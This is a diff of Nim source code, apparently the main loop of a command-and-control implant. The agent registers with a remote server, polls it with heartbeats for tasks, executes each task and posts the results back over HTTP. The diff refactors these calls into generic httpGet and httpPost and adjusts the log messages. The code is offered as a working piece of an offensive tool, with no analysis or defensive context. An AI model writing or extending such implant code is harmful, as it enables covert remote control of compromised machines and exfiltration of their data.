@@ -61,7 +61,9 @@ proc main() =
     var registration: AgentRegistrationData = config.collectAgentMetadata()
     let registrationBytes = config.serializeRegistrationData(registration)
 
-    config.register(registrationBytes)
+    if not config.httpPost(registrationBytes): 
+        echo "[-] Agent registration failed."
+        quit(0)
     echo fmt"[+] [{config.agentId}] Agent registered."
 
     #[
@@ -86,16 +88,16 @@ proc main() =
             var heartbeat: Heartbeat = config.createHeartbeat()
             let 
                 heartbeatBytes: seq[byte] = config.serializeHeartbeat(heartbeat)
-                packet: string = config.getTasks(heartbeatBytes)
+                packet: string = config.httpGet(heartbeatBytes)
 
             if packet.len <= 0: 
-                echo "No tasks to execute."
+                echo "[*] No tasks to execute."
                 continue
 
             let tasks: seq[Task] = config.deserializePacket(packet)
             
             if tasks.len <= 0: 
-                echo "No tasks to execute."
+                echo "[*] No tasks to execute."
                 continue
 
             # Execute all retrieved tasks and return their output to the server
@@ -103,7 +105,7 @@ proc main() =
                 var result: TaskResult = config.handleTask(task)
                 let resultBytes: seq[byte] = config.serializeTaskResult(result)
 
-                config.postResults(resultBytes)
+                config.httpPost(resultBytes)
 
         except CatchableError as err: 
             echo "[-] ", err.msg
